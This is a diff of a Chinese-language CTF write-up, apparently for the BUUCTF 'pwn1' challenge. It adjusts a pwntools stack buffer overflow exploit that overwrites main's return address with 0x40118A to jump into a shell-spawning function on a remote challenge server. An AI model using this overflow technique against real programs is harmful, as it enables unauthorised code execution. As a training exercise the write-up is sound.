@@ -429,14 +429,14 @@
 </code></pre></div>
 
 <p>所以我们需要将main函数的返回地址覆盖为fun函数的地址0x401186</p>
-<p>由于是64位程序，所以我们覆盖为0xF * 'a' + 8 * 'b' + 0x401186</p>
+<p>由于是64位程序，所以我们覆盖为0xF * 'a' + 8 * 'b' + 0x40118A(直接覆盖好像不太行)</p>
 <p>exp为</p>
 <div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="c1">#io = process(&#39;./pwn1&#39;)</span>
 <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node3.buuoj.cn&#39;</span><span class="p">,</span> <span class="mi">29755</span><span class="p">)</span>
 
-<span class="n">system_addr</span> <span class="o">=</span> <span class="mh">0x401186</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="mh">0x40118A</span>
 
 <span class="n">payload</span> <span class="o">=</span> <span class="mh">0xF</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="s1">&#39;b&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
 
